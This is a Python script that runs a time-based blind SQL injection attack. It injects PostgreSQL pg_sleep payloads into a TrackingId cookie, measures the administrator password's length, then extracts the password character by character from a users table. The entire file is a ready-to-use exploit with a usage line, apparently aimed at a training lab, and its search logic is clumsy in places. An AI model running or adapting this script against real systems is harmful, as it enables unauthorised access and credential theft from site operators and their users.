#!/usr/bin/python3
#Time induced
import requests
import sys
import string

if len(sys.argv) != 3:
    print('USAGE: blind.py <url> <time>')
    sys.exit(1)

print("Please update the session and also playload based on your needs and the db values")

url = sys.argv[1]
r = requests.get(url)

TrackingId = "TrackingId=" + r.cookies["TrackingId"]
session = "; session=" + r.cookies["session"]
len_found = False
time = 2

count = 1
while (len_found == False):
    test_val = False
    ok = "Trying..." + str(count)
    print(ok, end="\r", flush=True)
    pay = "'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)<"+str(count)+") THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"
    ses = TrackingId + pay \
                + session
    headers = {'Cookie': ses}
    #print('try 0')
    #print(ses)
    try:
        r = requests.get(url, headers=headers,timeout=time)
    except:
        test_val = True

    if test_val == True:
        #print('we are here')
        len_found = True
    count += 1


pay = \
    "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')"
l = count
passs = ''
for y in range(1, l):
    pay = "'||(SELECT CASE WHEN (username='administrator' AND ascii(substring(password,"+str(y)+",1))=100) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"
    found = False
    inti = 48
    fina = 122
    i = 48
    j = 122
    total = 74
    while found == False:
        test_val = False
        re = "Retriving.." + passs
        print(re, end="\r", flush=True)
        #print ('i={0},j={1},current={2}'.format(i, j, inti + int((max(i,j) - min(i, j)) / 2)))
        current = inti + int((max(i, j) - min(i, j)) / 2)
        #print('int={0},chr={1}'.format(current, chr(current)))
        test = "'||(SELECT CASE WHEN (username='administrator' AND ascii(substring(password,"+str(y)+",1))="+str(current)+") THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"

        #print(test)

        might = False
        t = 0
        if might == False:
            ses = TrackingId + test \
                + session
            headers = {'Cookie': ses}
            print('try 1')
            print(ses)
            try:
                r = requests.get(url, headers=headers,timeout=time)
            except:
                test_val = True

            if test_val == True:
                #print('we are here')
                might = True
                found = True
                passs += chr(current)
        if might == False:
            test_val = False
            test1 = "'||(SELECT CASE WHEN (username='administrator' AND ascii(substring(password,"+str(y)+",1))<"+str(current)+") THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)--"
            ses = TrackingId + test1 \
                + session
            print('try 2')
            print(ses)

            headers = {'Cookie': ses}

        try:
            r = requests.get(url, headers=headers,timeout=time)
        except:
            test_val = True
        if test_val == True:
            #print('found')
            t = 1
        else:
            t = 0

        if t == 0:
            i = current
            inti = current
        elif t == 1:
            j = current

print(passs)
